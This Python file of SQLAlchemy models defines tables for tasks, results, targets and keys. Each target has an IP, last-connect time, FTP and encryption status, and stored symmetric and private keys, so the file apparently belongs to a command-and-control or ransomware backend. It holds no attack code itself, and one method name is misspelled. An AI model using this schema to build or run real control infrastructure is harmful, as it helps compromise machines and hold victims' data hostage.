from database.db import db
from sqlalchemy.dialects.postgresql import JSON
from sqlalchemy import Text

class Task(db.Model):
    __tablename__ = 'tasks'
    
    id = db.Column(db.Integer, primary_key=True)
    task_id = db.Column(db.String(100), nullable=False)
    task_type = db.Column(db.String(100), nullable=True)
    
    def __repre__(self):
        return f'<Task {self.task_id}>'
    
    def to_dict(self):
        return {
            'id': self.id,
            'task_id': self.task_id,
            'task_type': self.task_type
        }

class Result(db.Model):
    __tablename__ = 'results'
    
    # id is the auto-created primary key
    id = db.Column(db.Integer, primary_key=True)
    
    # result is a uuid string of 100 chars
    result_id = db.Column(db.String(100), nullable=False)
    content = db.Column(db.String(512), nullable=True)
    success = db.Column(db.Integer, nullable=False)
    
    # returns the task_id when an instance of Result is printed
    def __repr__(self):
        return f'<Result {self.result_id}>'
    
    def to_dict(self):
        return {
            'id': self.id,
            'result_id': self.result_id,
            'content': self.content,
            'success': self.success
        }

class Target(db.Model):
    __tablename__ = 'targets'
    
    id = db.Column(db.Integer, primary_key=True)
    target_id = db.Column(db.String(100), nullable=False)
    ip = db.Column(db.String(45), nullable=False)
    last_connect = db.Column(db.DateTime, nullable=False)
    ftp_status = db.Column(db.String(64), nullable=False)
    encryption_status = db.Column(db.String(64), nullable=False)
    public_key = db.Column(db.String(100), nullable=False)
    tasks = db.Column(JSON, nullable=True)
    results = db.Column(JSON, nullable=True)
    
    def __repr__(self):
        return f'<Target {self.target_id}>'

    def to_dict(self):
        return {
            'id': self.id,
            'target_id': self.target_id,
            'ip': self.ip,
            'last_connect': str(self.last_connect),
            'ftp_status': self.ftp_status,
            'encryption_status': self.encryption_status,
            'public_key': self.public_key,
            'tasks': self.tasks,
            'results': self.results,
        }

class Key(db.Model):
    __tablename__ = 'keys'
    
    id = db.Column(db.Integer, primary_key=True)
    target_id = db.Column(db.String(100), nullable=False)
    symmetric_key = db.Column(db.String(100), nullable=True)
    public_key = db.Column(Text, nullable=False)
    private_key = db.Column(Text, nullable=False)
    
    def __repr__(self):
        return f'<Key {self.target_id}>'
    
    def to_dict(self):
        return {
            'id': self.id,
            'target_id': self.target_id,
            'symmetric_key': self.symmetric_key,
            'public_key': self.public_key,
            'private_key': self.private_key
        }
    